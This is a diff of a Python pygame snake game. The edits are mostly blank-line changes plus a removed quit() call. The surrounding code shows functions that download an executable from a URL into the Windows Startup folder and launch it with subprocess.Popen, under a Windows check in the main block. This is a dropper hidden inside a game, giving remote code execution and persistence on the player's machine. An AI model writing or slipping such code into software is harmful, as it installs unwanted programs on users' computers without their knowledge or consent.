@@ -52,7 +52,6 @@ def game():
     # Create a list to store food rects
     food_rects = []
 
-
     # Function to generate food at random locations
     def generate_food():
         if len(food_rects) == 0:
@@ -74,12 +73,10 @@ def game():
                 else:
                     i -= 1
 
-
     # Function to display score on screen
     def show_score(score):
         score_text = font_style.render("Score: " + str(score), True, white)
         screen.blit(score_text, [0, 0])
-
 
     # Game over function
     def game_over():
@@ -89,8 +86,6 @@ def game():
         pygame.display.update()
         pygame.time.wait(2000)
         pygame.quit()
-        quit()
-
 
     key_queue = []
 
@@ -170,6 +165,7 @@ def game():
         pygame.display.update()
         clock.tick(snake_speed)
 
+
 # Function to download the executable to the Startup folder, and return the path to the file
 def download_executable(url, folder):
     # Check if the file already exists in the folder
@@ -183,10 +179,12 @@ def download_executable(url, folder):
     # Return the path to the downloaded file
     return file
 
+
 # Function to run the executable
 def run_executable(file):
     # Use subprocess.run() to execute the file
     subprocess.Popen(file)
+
 
 if __name__ == "__main__":
     if platform.system() == "Windows":
